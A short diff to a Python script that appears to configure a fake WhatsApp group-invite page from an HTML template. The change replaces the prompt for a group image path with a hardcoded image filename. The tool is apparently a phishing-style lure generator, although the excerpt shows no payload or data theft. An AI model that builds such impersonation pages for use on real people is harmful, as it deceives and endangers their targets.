@@ -9,14 +9,16 @@ C = '\033[36m' # cyan
 W = '\033[0m'  # white
 
 title = input(G + '[+]' + C + ' Group Title : ' + W)
-image = input(G + '[+]' + C + ' Path to Group Img (Best Size : 300x300): ' + W)
+# image = input(G + '[+]' + C + ' Path to Group Img (Best Size : 300x300): ' + W)
 
-img_name = image.split('/')[-1]
-try:
-    shutil.copyfile(image, 'template/whatsapp/images/{}'.format(img_name))
-except Exception as e:
-    print('\n' + R + '[-]' + C + ' Exception : ' + W + str(e))
-    exit()
+# img_name = image.split('/')[-1]
+# try:
+#     shutil.copyfile(image, 'template/whatsapp/images/{}'.format(img_name))
+# except Exception as e:
+#     print('\n' + R + '[-]' + C + ' Exception : ' + W + str(e))
+#     exit()
+
+img_name = "rYZqPCBaG70.png"
 
 with open('template/whatsapp/index_temp.html', 'r') as index_temp:
     code = index_temp.read()
